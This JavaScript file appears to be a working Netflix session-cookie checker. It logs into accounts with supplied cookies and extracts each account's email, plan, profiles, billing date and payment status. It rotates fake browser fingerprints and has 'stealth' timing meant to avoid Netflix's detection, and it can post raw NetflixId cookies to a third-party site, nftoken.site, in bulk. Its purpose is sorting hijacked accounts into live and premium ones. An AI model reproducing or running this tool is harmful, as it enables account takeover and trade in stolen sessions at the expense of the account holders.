'use strict';

// Standalone Netflix cookie checker core (Express-free).
// Copied/adapted from the main server so this tool runs on its own.
const https = require('https');
const http = require('http');
const zlib = require('zlib');

const {
  nfExtractEmailFromHtml,
  nfDetectPaymentHold,
  nfAccountPagePaymentHold,
} = require('./nf-email-parse');
const {
  nfHasPaymentElement,
  nfHasActiveMembershipSignals,
  nfHasActiveFutureBilling,
  nfBillingIsFuture,
  nfResolveSubscriptionStatus,
} = require('./nf-account-live');

function nodeRequest(url, options = {}) {
  const timeoutMs = options.timeout || 20000;
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const lib = u.protocol === 'https:' ? https : http;
    const isPost = (options.method || 'GET').toUpperCase() === 'POST';
    const bodyBuf = Buffer.from(options.body || '', 'utf8');
    const reqOpts = {
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search,
      method: options.method || 'GET',
      headers: { ...(options.headers || {}), ...(isPost ? { 'Content-Length': bodyBuf.length } : {}) },
    };
    const req = lib.request(reqOpts, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const rawBuf = Buffer.concat(chunks);
        const enc = (res.headers['content-encoding'] || '').toLowerCase();
        const decompress = (buf) => new Promise((ok, fail) => {
          if (enc === 'gzip' || enc === 'x-gzip') zlib.gunzip(buf, (e, d) => e ? fail(e) : ok(d));
          else if (enc === 'deflate') zlib.inflate(buf, (e, d) => e ? zlib.inflateRaw(buf, (e2, d2) => e2 ? fail(e2) : ok(d2)) : ok(d));
          else if (enc === 'br') zlib.brotliDecompress(buf, (e, d) => e ? fail(e) : ok(d));
          else ok(buf);
        });
        decompress(rawBuf).then(buf => {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            buffer: buf,
            text: () => buf.toString('utf8'),
            json: () => JSON.parse(buf.toString('utf8').replace(/^\uFEFF/, '')),
          });
        }).catch(reject);
      });
    });
    req.setTimeout(timeoutMs, () => { req.destroy(); reject(new Error('timeout')); });
    req.on('error', reject);
    if (isPost && bodyBuf.length) req.write(bodyBuf);
    req.end();
  });
}

// Pool UA + sec-ch-ua khớp nhau — xoay để mỗi request trông như browser khác nhau.
const NF_UA_POOL = [
  {
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    chUa: '"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="24"',
    platform: '"Windows"',
  },
  {
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
    chUa: '"Chromium";v="146", "Microsoft Edge";v="146", "Not?A_Brand";v="24"',
    platform: '"Windows"',
  },
  {
    ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    chUa: '"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="24"',
    platform: '"macOS"',
  },
];

function createNetflixBrowserSession(cookieStr, extra = {}) {
  const p = NF_UA_POOL[Math.floor(Math.random() * NF_UA_POOL.length)];
  const common = {
    'User-Agent': p.ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'sec-ch-ua': p.chUa,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': p.platform,
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    Cookie: cookieStr.trim(),
    ...extra,
  };
  return {
    home: { ...common, 'Sec-Fetch-Site': 'none' },
    account: { ...common, 'Sec-Fetch-Site': 'same-origin', Referer: 'https://www.netflix.com/browse' },
  };
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const randDelay = (min = 800, max = 2500) =>
  sleep(min + Math.floor(Math.random() * Math.max(1, max - min)));

const CHECK_PACES = {
  normal: {
    preMin: 800, preMax: 2500, gapMin: 1500, gapMax: 4000,
    warmupMin: 0, warmupMax: 0, betweenMin: 0, betweenMax: 0,
    nftMin: 0, nftMax: 800, skipNftoken: false, warmup: false,
  },
  slow: {
    preMin: 5000, preMax: 11000, gapMin: 12000, gapMax: 25000,
    warmupMin: 800, warmupMax: 2200, betweenMin: 1200, betweenMax: 3500,
    nftMin: 0, nftMax: 0, skipNftoken: true, warmup: true,
  },
  stealth: {
    preMin: 10000, preMax: 22000, gapMin: 20000, gapMax: 45000,
    warmupMin: 1500, warmupMax: 4000, betweenMin: 2500, betweenMax: 6000,
    nftMin: 0, nftMax: 0, skipNftoken: true, warmup: true,
  },
};

const CHECK_MAX_PER_HOUR = Math.max(10, parseInt(process.env.CHECK_MAX_PER_HOUR || '50', 10) || 50);
const checkRateState = { windowStart: Date.now(), count: 0 };

function assertCheckRateLimit() {
  const now = Date.now();
  if (now - checkRateState.windowStart > 3600000) {
    checkRateState.windowStart = now;
    checkRateState.count = 0;
  }
  checkRateState.count += 1;
  if (checkRateState.count > CHECK_MAX_PER_HOUR) {
    const err = new Error(`Reached ${CHECK_MAX_PER_HOUR} checks/hour — wait ~${Math.ceil((3600000 - (now - checkRateState.windowStart)) / 60000)} minutes to avoid Netflix IP scanning`);
    err.code = 'RATE_LIMIT';
    throw err;
  }
}

function resolveCheckPace(id) {
  const key = String(id || process.env.CHECK_PACE || 'stealth').toLowerCase().trim();
  const cfg = CHECK_PACES[key] || CHECK_PACES.stealth;
  return { ...cfg, key: CHECK_PACES[key] ? key : 'stealth' };
}

const CHECK_DEBUG = String(process.env.CHECK_DEBUG || '').toLowerCase() === '1';
function nfLog(...args) { if (CHECK_DEBUG) console.log(...args); }

function isNetflixPremiumPlan(planStr) {
  if (!planStr || typeof planStr !== 'string') return false;
  const lower = planStr.toLowerCase().trim();
  const expired = ['expired', 'cancelled', 'canceled', 'inactive', 'no plan', 'no active', 'ended', 'hết hạn', 'đã huỷ'];
  if (expired.some(kw => lower.includes(kw))) return false;
  const nonPremium = ['ads', 'free', 'with ads', 'standard with ads', 'basic with ads'];
  if (nonPremium.some(kw => lower.includes(kw))) return false;
  return true;
}

function nfClean(value) {
  if (value == null) return '';
  const safeCodePoint = (n) => { try { return String.fromCodePoint(n); } catch { return ''; } };
  return String(value)
    .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
    .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
    .replace(/&#x([0-9a-fA-F]+);/g,  (_, h) => safeCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);/g,            (_, d) => safeCodePoint(parseInt(d, 10)))
    .replace(/&nbsp;/gi, ' ').replace(/&amp;/gi, '&').replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>').replace(/&quot;/gi, '"').replace(/&#39;/g, "'")
    .replace(/\\"/g, '"').replace(/\\\//g, '/').replace(/\s+/g, ' ').trim();
}

function nfVisibleLines(html) {
  return String(html || '')
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<br\s*\/?>/gi, '\n')
    .replace(/<\/(?:div|p|h[1-6]|li|section|article|button|span)>/gi, '\n')
    .replace(/<[^>]+>/g, ' ')
    .split(/\n+/)
    .map(l => nfClean(l))
    .filter(Boolean);
}

function nfJsonValues(html, keys) {
  const values = [];
  for (const key of keys) {
    const re = new RegExp(`"${key}"\\s*:\\s*"((?:\\\\.|[^"\\\\]){1,240})"`, 'gi');
    for (const m of String(html || '').matchAll(re)) {
      const v = nfClean(m[1]);
      if (v && !values.includes(v)) values.push(v);
    }
  }
  return values;
}

const NF_DATE_PATS = [
  /(?:Ngày\s*)?\d{1,2}\s+tháng\s+\d{1,2}\s+năm\s+\d{4}/i,
  /\b(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\s+\d{1,2},?\s+\d{4}\b/i,
  /\b\d{1,2}\s+(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\s+\d{4}\b/i,
  /\b\d{4}-\d{2}-\d{2}\b/,
  /\b\d{1,2}[./-]\d{1,2}[./-]\d{2,4}\b/,
];
function nfExtractDate(value) {
  const text = nfClean(value);
  if (!text) return null;
  for (const pat of NF_DATE_PATS) { const m = text.match(pat); if (m) return nfClean(m[0]); }
  return null;
}

function nfExtractBilling(html) {
  if (!html) return null;
  const dateKeys = [
    'nextBillingDate','nextPaymentDate','nextPayment','billingDate',
    'renewalDate','currentBillingPeriodEndDate','subscriptionEndDate',
    'membershipEndDate','nextChargeDate','periodEndDate',
  ];
  for (const v of nfJsonValues(html, dateKeys)) {
    const d = nfExtractDate(v); if (d) return d;
  }
  const mStatusMatch = html.match(/"membershipStatus"\s*:\s*\{([^}]{1,600})\}/);
  if (mStatusMatch) {
    const d = nfExtractDate(mStatusMatch[1]);
    if (d) return d;
  }
  const text  = nfVisibleLines(html).join(' ');
  const lower = text.toLowerCase();
  const labels = [
    'next payment','next billing','renews on','renewal date','billed on',
    'thanh toán tiếp theo','ngày thanh toán tiếp theo','lần thanh toán tiếp theo',
    'วันที่เรียกเก็บเงินถัดไป',
  ];
  for (const label of labels) {
    const idx = lower.indexOf(label);
    if (idx === -1) continue;
    const d = nfExtractDate(text.slice(idx, idx + 320));
    if (d) return d;
  }
  return null;
}

function nfExtractPlan(html) {
  if (!html) return null;
  const planKeys = [
    'planName','planLabel','planDisplayName','currentPlanName','localizedPlanName',
    'membershipPlanName','planTitle','subscriptionPlanName','currentPlanDisplayName',
    'userPlanName','planNameForDisplay',
  ];
  for (const v of nfJsonValues(html, planKeys)) {
    const m = v.match(/\b(?:Ultra|Premium|Standard|Basic|Mobile)(?:\+|\s+(?:with\s+Ads|Ads))?\b/i)
           || v.match(/Gói\s+(?:cao cấp|tiêu chuẩn|cơ bản|di động)/i)
           || v.match(/(?:แผน|แพ็กเกจ)\s*(?:พรีเมียม|มาตรฐาน|พื้นฐาน|มือถือ)/i);
    if (m) return nfClean(m[0]);
    if (v.length >= 3 && v.length < 60 && !v.includes('http') && !v.includes('{')) return nfClean(v);
  }
  const PLAN_RE = /\b(?:Ultra|Premium|Standard|Basic|Mobile)(?:\+|\s+(?:with\s+Ads|Ads))?\b/i;
  const VI_PLAN_RE = /Gói\s+(?:Cao cấp|Tiêu chuẩn|Cơ bản|Di động)/i;
  const THAI_RE = /(?:Netflix\s+)?(?:พรีเมียม|มาตรฐาน|พื้นฐาน|มือถือ|เบสิก|สแตนดาร์ด)/;
  const lines = nfVisibleLines(html);
  for (const line of lines) {
    const m = line.match(PLAN_RE) || line.match(VI_PLAN_RE) || line.match(THAI_RE);
    if (m && line.length < 100) return nfClean(m[0]);
  }
  const raw = html.match(PLAN_RE) || html.match(VI_PLAN_RE) || html.match(THAI_RE);
  if (raw) return nfClean(raw[0]);
  return null;
}

function nfPushProfile(profiles, rawName) {
  const name = nfClean(rawName);
  if (!name || /^\d+$/.test(name) || profiles.includes(name)) return;
  profiles.push(name);
}

function nfBillingLooksLikeMemberSince(text) {
  return /thành viên từ|member since/i.test(String(text || ''));
}

const NF_PAYERR_PHRASES = [
  'payment failed', 'payment unsuccessful', 'unable to process your payment',
  "couldn't process your payment", 'problem with your payment', 'payment method was declined',
  'account is on hold', 'your account is on hold', 'on hold. retry', 'retry your payment',
  'thanh toán không thành công', 'không thể xử lý khoản thanh toán',
  'cập nhật thông tin thanh toán để tiếp tục',
];

function nfAccountPaymentError(html) {
  const low = String(html || '').toLowerCase();
  if (NF_PAYERR_PHRASES.some((p) => low.includes(p))) return true;
  return /"(?:paymentIssue|paymentError|paymentFailed|billingIssue)"\s*:\s*(?:true|1|"true")/i.test(html || '');
}

async function fetchNetflixAccountInfo(cookieStr, pace) {
  try {
    const cookie = cookieStr.trim();
    const p = pace || resolveCheckPace();
    const session = createNetflixBrowserSession(cookie);

    await randDelay(p.preMin, p.preMax);

    let browsePaymentHold = false;
    if (p.warmup) {
      try {
        const browseRes = await nodeRequest('https://www.netflix.com/browse', {
          method: 'GET', headers: session.home, timeout: 12000,
        });
        if (browseRes.status === 200) browsePaymentHold = nfDetectPaymentHold(browseRes.text());
      } catch { /* ignore */ }
      await randDelay(p.warmupMin, p.warmupMax);
      await randDelay(p.betweenMin, p.betweenMax);
    }

    const res = await nodeRequest('https://www.netflix.com/account', {
      method: 'GET', headers: session.account, timeout: 15000,
    });

    if (res.status === 301 || res.status === 302) return { reachable: false, reason: 'redirect→login' };
    if (res.status !== 200) return { reachable: false, reason: `HTTP ${res.status}` };

    let html = res.text();
    if (!html || html.length < 3000) return { reachable: false, reason: 'empty' };

    let membershipHtml = '';
    try {
      await randDelay(350, 900);
      const memRes = await nodeRequest('https://www.netflix.com/account/membership', {
        method: 'GET', headers: session.account, timeout: 15000,
      });
      if (memRes.status === 200) {
        membershipHtml = memRes.text() || '';
        if (membershipHtml.length > 2000) html += `\n<!-- membership -->\n${membershipHtml}`;
      }
    } catch { /* optional */ }

    const hasPaymentEl = nfHasPaymentElement(html);
    nfLog(`[NF] status=${res.status} len=${html.length} paymentEl=${hasPaymentEl}`);

    let plan = null;
    const planUia = html.match(/data-uia="account-overview-page\+membership-card\+title"[^>]*>\s*([^<]{2,60})/);
    if (planUia) plan = nfClean(planUia[1]);
    if (!plan) plan = nfExtractPlan(html);

    let accountPaymentHold = nfAccountPagePaymentHold(html);
    let paymentHold = browsePaymentHold || accountPaymentHold;
    let paymentError = paymentHold || nfAccountPaymentError(html);

    let billingText = null;
    const billUia = html.match(/data-uia="account-overview-page\+membership-card\+description"[^>]*>\s*([^<]{4,120})/);
    if (billUia) billingText = nfClean(billUia[1]);
    if (!billingText) billingText = nfExtractBilling(html);
    if (membershipHtml && (!billingText || nfBillingLooksLikeMemberSince(billingText))) {
      const memBilling = nfExtractBilling(membershipHtml);
      if (memBilling) billingText = memBilling;
    }
    if (!billingText || nfBillingLooksLikeMemberSince(billingText)) {
      const scraped = nfExtractBilling(html);
      if (scraped && !nfBillingLooksLikeMemberSince(scraped)) billingText = scraped;
    }

    const membershipActiveUi = nfHasActiveMembershipSignals(html, billingText);
    if (browsePaymentHold && !accountPaymentHold && membershipActiveUi) {
      browsePaymentHold = false;
      paymentHold = false;
      paymentError = nfAccountPaymentError(html);
    }

    const futureBillingOnAccount = !!(plan && billingText && nfHasActiveFutureBilling(html, billingText));

    let browseVerifyHold = false;
    if (plan && !paymentHold && !futureBillingOnAccount) {
      try {
        await randDelay(400, 1200);
        const br = await nodeRequest('https://www.netflix.com/browse', {
          method: 'GET', headers: session.home, timeout: 12000,
        });
        if (br.status === 200) {
          browseVerifyHold = nfDetectPaymentHold(br.text());
          if (browseVerifyHold && (!membershipActiveUi || accountPaymentHold)) paymentHold = true;
        }
      } catch { /* ignore */ }
    }

    const emailFromHtml = nfExtractEmailFromHtml(html);

    const profiles = [];
    for (const m of html.matchAll(/"profileName"\s*:\s*"((?:\\.|[^"\\]){1,80})"/g)) nfPushProfile(profiles, m[1]);
    if (!profiles.length) {
      const raw = html.match(/"profiles"\s*:\s*(\[[\s\S]{1,8000}?\])/)?.[1];
      if (raw) {
        try {
          for (const pf of JSON.parse(raw)) {
            nfPushProfile(profiles, pf?.summary?.profileName || pf?.profileName || pf?.name || '');
          }
        } catch {}
      }
    }
    if (!profiles.length) {
      for (const m of html.matchAll(/data-uia="profile-name"[^>]*>\s*([^<]+)/g)) nfPushProfile(profiles, m[1]);
    }
    if (!profiles.length) {
      for (const m of html.matchAll(/"displayName"\s*:\s*"((?:\\.|[^"\\]){1,80})"/g)) nfPushProfile(profiles, m[1]);
    }

    const resolved = nfResolveSubscriptionStatus({
      html, plan, billingText, profiles,
      accountPaymentHold, paymentHold, paymentError, membershipActiveUi,
    });
    paymentHold = resolved.paymentHold;
    paymentError = resolved.paymentError;
    billingText = resolved.billingText || billingText;
    const subscriptionActive = resolved.subscriptionActive;
    const isLive = resolved.isLive;
    const planLost = resolved.planLost;
    const membershipEnded = !!resolved.cancelled;

    return {
      reachable: true,
      alive: isLive,
      cancelled: membershipEnded || (!subscriptionActive && !paymentHold && !planLost),
      planLost,
      plan,
      billingText,
      profiles,
      paymentError,
      paymentHold,
      accountPaymentHold,
      futureBilling: resolved.futureBilling,
      browsePaymentHold: browsePaymentHold || browseVerifyHold,
      emailFromHtml,
    };
  } catch (e) {
    return { reachable: false, error: e.message };
  }
}

// nftoken.site checker
async function checkAccountDetails(cookieStr) {
  try {
    let cookie = cookieStr.trim();
    const idx = cookie.indexOf('NetflixId=');
    if (idx > 0) cookie = cookie.substring(idx);

    const bodyStr = new URLSearchParams({ raw_cookie: cookie, ajax: '1', is_bulk: '1' }).toString();
    const result = await nodeRequest('https://nftoken.site/cookies/index.php', {
      method: 'POST',
      headers: {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://nftoken.site',
        'referer': 'https://nftoken.site/cookies/',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'XMLHttpRequest',
      },
      body: bodyStr,
    });

    let data;
    try { data = result.json(); } catch { return { alive: false, plan: null, email: null, screens: null, paymentError: false, raw: null }; }

    const alive      = data?.status === 'SUCCESS';
    const plan       = data?.plan || data?.subscription || null;
    const email      = data?.email || data?.mail || data?.loginEmail || data?.login
      || data?.member_email || data?.user_email || data?.account_email || null;
    const screens    = data?.max_streams != null ? parseInt(data.max_streams) : null;
    const hasPremium = alive && isNetflixPremiumPlan(plan);
    const paymentError = !!(data?.paymentError || data?.payment_error);

    const statusStr = String(data?.status || '').toUpperCase();
    const msgStr = String(data?.message || data?.msg || data?.error || '').toLowerCase();
    const definitiveDead = !!data && statusStr !== 'SUCCESS'
      && (statusStr === 'DEAD' || /dead|expired|invalid|cancel|hold|inactive|fail/i.test(msgStr));

    return { alive, hasPremium, plan, email, screens, paymentError, definitiveDead, raw: data };
  } catch (e) {
    return { alive: false, hasPremium: false, plan: null, email: null, screens: null, paymentError: false, definitiveDead: false, raw: null, error: e.message };
  }
}

function getNftokenMode() {
  const raw = String(process.env.NFTOKEN_MODE || process.env.USE_NFTOKEN || 'fallback').toLowerCase().trim();
  if (raw === '1' || raw === 'true' || raw === 'on' || raw === 'parallel') return 'parallel';
  if (raw === 'fallback') return 'fallback';
  return 'off';
}

const NFT_SKIPPED = { alive: false, hasPremium: false, plan: null, email: null, screens: null, paymentError: false, definitiveDead: false, raw: null, skipped: true };

function mergeCheckResults(nf, nft) {
  const plan = nf.plan || nft.plan || null;
  let paymentHold = !!nf.paymentHold;
  let paymentError = !!nf.paymentError || !!(nft.paymentError && !nf.reachable);
  let planLost = !!nf.planLost;
  let alive = false;

  if (nf.reachable) {
    alive = !!nf.alive;
    if (nf.cancelled) {
      alive = false; planLost = false; paymentError = false; paymentHold = false;
    } else if (nf.accountPaymentHold) {
      alive = false; paymentHold = true; paymentError = true; planLost = !!plan;
    } else {
      const hasProfiles = Array.isArray(nf.profiles) && nf.profiles.length > 0;
      const futureBill = !!(nf.futureBilling || (nf.billingText && nfBillingIsFuture(nf.billingText)));
      if (plan && (futureBill || hasProfiles || nf.alive)) {
        alive = true; planLost = false; paymentError = false; paymentHold = false;
      }
    }
  } else if (!nft.skipped && nft.alive) {
    alive = !!nft.alive && !paymentError;
  }

  if (!nft.skipped && nft.definitiveDead) {
    alive = false; paymentHold = true; paymentError = true; planLost = !!plan;
  }

  let source = 'none';
  if (nft.skipped) {
    source = nf.reachable ? 'direct' : 'none';
  } else if (nft.definitiveDead) {
    source = 'nftoken';
  } else if (nf.reachable && nft.alive) {
    source = planLost ? 'direct' : 'direct+nftoken';
  } else if (nft.alive && !nf.reachable) {
    source = 'nftoken';
  } else if (nf.reachable) {
    source = 'direct';
  }

  return {
    alive,
    source,
    nftokenMode: getNftokenMode(),
    plan,
    email:        nf.emailFromHtml || nft.email || null,
    screens:      nft.screens      || null,
    hasPremium:   !!(nft.hasPremium || (alive && isNetflixPremiumPlan(plan))),
    paymentError,
    paymentHold,
    planLost,
    profiles:     nf.profiles      || [],
    billingText:  nf.billingText   || null,
    cancelled:    !!(nf.cancelled && !planLost) || (!alive && nf.reachable && !planLost),
    reachable:    !!(nf.reachable),
    _nft: nft.skipped ? { skipped: true } : { alive: nft.alive, definitiveDead: !!nft.definitiveDead, error: nft.error },
    _nf:  { reachable: nf.reachable, alive: nf.alive, error: nf.error },
  };
}

async function runNftokenCheck(cookieStr) {
  return checkAccountDetails(cookieStr).catch(e => ({
    alive: false, hasPremium: false, plan: null, email: null, screens: null,
    paymentError: false, definitiveDead: false, raw: null, error: e.message, skipped: false,
  }));
}

function shouldFallbackNftoken(nf) {
  if (!nf.reachable) return true;
  if (!nf.emailFromHtml) return true;
  if (nf.alive && !nf.plan) return true;
  return false;
}

function checkResultToStatus(out) {
  if (!out || typeof out !== 'object') return 'unknown';
  if (out.rateLimited) return 'inconclusive';
  if (out.alive) return 'live';
  if (out.paymentHold) return 'payment_hold';
  if (out.planLost) return 'plan_lost';
  if (out.verifyInconclusive) return 'inconclusive';
  if (out.reachable === false && !out.source) return 'inconclusive';
  return 'dead';
}

async function fullCheck(cookieStr, paceId) {
  try {
    assertCheckRateLimit();
    const pace = resolveCheckPace(paceId);
    const mode = getNftokenMode();
    const nf = await fetchNetflixAccountInfo(cookieStr, pace).catch(e => ({
      reachable: false, alive: false, error: e.message, profiles: [],
    }));

    let nft = NFT_SKIPPED;
    let inconclusiveVerify = false;

    if (!pace.skipNftoken) {
      if (mode === 'parallel') {
        await randDelay(pace.nftMin, pace.nftMax);
        nft = await runNftokenCheck(cookieStr);
      } else if (mode === 'fallback' && shouldFallbackNftoken(nf)) {
        await randDelay(pace.nftMin, pace.nftMax);
        nft = await runNftokenCheck(cookieStr);
      }
    }

    const verifyLiveEnabled = process.env.VERIFY_LIVE_NFTOKEN !== '0' && mode !== 'off';
    if (verifyLiveEnabled && nft.skipped && nf.reachable && nf.alive) {
      const maxTries = Math.max(1, parseInt(process.env.VERIFY_LIVE_RETRIES || '2', 10) || 2);
      for (let attempt = 1; attempt <= maxTries; attempt++) {
        await randDelay(pace.nftMin || 400, pace.nftMax || 1500);
        nft = await runNftokenCheck(cookieStr);
        if (nft.definitiveDead || nft.alive) break;
      }
      inconclusiveVerify = !nft.definitiveDead && !nft.alive;
    }

    const out = mergeCheckResults(nf, nft);
    out.checkPace = pace.key;
    if (pace.skipNftoken && nft.skipped) out.nftokenSkippedStealth = true;
    if (inconclusiveVerify) out.verifyInconclusive = true;
    return out;
  } catch (e) {
    const out = { alive: false, error: e.message, profiles: [], plan: null, billingText: null, nftokenMode: getNftokenMode() };
    if (e.code === 'RATE_LIMIT') out.rateLimited = true;
    return out;
  }
}

module.exports = { fullCheck, checkResultToStatus, mergeCheckResults, resolveCheckPace, CHECK_PACES, getNftokenMode };
